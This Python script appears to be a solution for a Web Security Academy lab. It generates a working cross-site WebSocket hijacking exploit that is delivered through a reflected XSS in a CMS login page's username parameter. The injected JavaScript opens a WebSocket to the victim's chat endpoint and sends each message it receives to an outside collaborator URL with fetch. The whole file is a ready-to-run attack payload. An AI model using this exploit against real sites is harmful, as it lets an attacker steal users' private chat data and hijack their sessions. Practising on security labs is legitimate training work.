import urllib.parse

LAB_ID = "???"
COLLABORATOR_URL = "???"

script = f"""
<script>
    new Promise(res => {{
    let webSocket = new WebSocket("wss://{LAB_ID}.web-security-academy.net/chat");

    webSocket.onopen = function (evt) {{
        webSocket.send("READY");
        res(webSocket);
    }};

    webSocket.onmessage = function (evt) {{
        var message = evt.data;
    fetch("{COLLABORATOR_URL}", {{
        method: "POST",
        body: message,
        mode: "no-cors"
    }})
    }};

    webSocket.onclose = function (evt) {{
    webSocket = undefined;
    console.log("message", "System:", "--- Disconnected ---");
    }};
    }});
</script>
"""
script = script.replace("\n", "")
while "  " in script:
    script = script.replace("  ", " ")
script = urllib.parse.quote(script)
print("Exploit:")
print(f"""
<script>
window.location.href="https://cms-{LAB_ID}.web-security-academy.net/login?username={script}&password=pass"
</script>
""")
